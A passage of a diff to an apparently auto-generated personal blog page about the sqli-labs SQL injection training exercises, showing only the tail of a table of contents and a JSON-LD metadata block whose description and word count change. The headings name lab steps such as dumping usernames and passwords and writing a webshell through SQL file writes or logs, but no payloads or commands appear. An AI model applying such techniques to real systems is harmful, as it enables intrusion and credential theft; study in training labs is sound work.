href="#4%E3%80%81fields-terminated-by%E5%86%99%E5%85%A5"><span class="toc-text">4、fields terminated by写入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5%E3%80%81COLUMNS-terminated-by%E5%86%99%E5%85%A5"><span class="toc-text">5、COLUMNS terminated by写入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6%E3%80%81%E5%88%A9%E7%94%A8log%E5%86%99%E5%85%A5"><span class="toc-text">6、利用log写入</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-6"><span class="toc-text">sqli-labs-6</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD-4"><span class="toc-text">初步判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0-3"><span class="toc-text">获取数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D-2"><span class="toc-text">获取所有表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E5%88%97%E5%90%8D"><span class="toc-text">获取users表中的所有列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89username%E5%92%8Cpassword"><span class="toc-text">获取users表中的所有username和password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell-2"><span class="toc-text">写入webshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-7"><span class="toc-text">sqli-labs-7</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD-5"><span class="toc-text">初步判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0-4"><span class="toc-text">获取数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D-3"><span class="toc-text">获取所有表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E5%88%97%E5%90%8D-1"><span class="toc-text">获取users表中的所有列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89username%E5%92%8Cpassword-1"><span class="toc-text">获取users表中的所有username和password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell-3"><span class="toc-text">写入webshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-8"><span class="toc-text">sqli-labs-8</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD-6"><span class="toc-text">初步判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0-5"><span class="toc-text">获取数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E4%BF%A1%E6%81%AF"><span class="toc-text">获取所有信息</span></a></li></ol></li></ol></li></ol>
     </div>
   </section>
 
@@ -4071,7 +3908,7 @@ limit 2,1<br>
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","sameAs":["https://github.com/volantis-x"],"description":"这是我的专属博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://chenzhengkai10.github.io/","name":"Dr4x3zz"}},{"@type":"ListItem","position":2,"item":{"@id":"https://chenzhengkai10.github.io/categories/sqli-labs/","name":"sqli-labs"}},{"@type":"ListItem","position":3,"item":{"@id":"https://chenzhengkai10.github.io/2022/12/21/sqli-labs-1-8/","name":"sqli-labs-1-8"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","keywords":null,"description":"这是我的专属博客","author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","description":"这是我的专属博客"},"publisher":{"@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://chenzhengkai10.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"sqli-labs-1-8","description":"# sqli-labs-1-8","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https://chenzhengkai10.github.io/2022/12/21/sqli-labs-1-8/"},"author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/"},"publisher":{"@type":"Organization","name":"Dr4x3zz","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://chenzhengkai10.github.io/2022/12/21/sqli-labs-1-8/","wordCount":15,"datePublished":"2022-12-21T12:20:08.000Z","dateModified":"2023-11-03T16:16:22.000Z","articleSection":"sqli-labs","keywords":"sqli-labs","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","sameAs":["https://github.com/volantis-x"],"description":"这是我的专属博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://chenzhengkai10.github.io/","name":"Dr4x3zz"}},{"@type":"ListItem","position":2,"item":{"@id":"https://chenzhengkai10.github.io/categories/sqli-labs/","name":"sqli-labs"}},{"@type":"ListItem","position":3,"item":{"@id":"https://chenzhengkai10.github.io/2022/12/21/sqli-labs-1-8/","name":"sqli-labs-1-8"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","keywords":null,"description":"这是我的专属博客","author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","description":"这是我的专属博客"},"publisher":{"@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://chenzhengkai10.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"sqli-labs-1-8","description":"sqli-labs-1-8","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https://chenzhengkai10.github.io/2022/12/21/sqli-labs-1-8/"},"author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/"},"publisher":{"@type":"Organization","name":"Dr4x3zz","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://chenzhengkai10.github.io/2022/12/21/sqli-labs-1-8/","wordCount":13,"datePublished":"2022-12-21T12:20:08.000Z","dateModified":"2023-11-03T16:16:22.000Z","articleSection":"sqli-labs","keywords":"sqli-labs","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
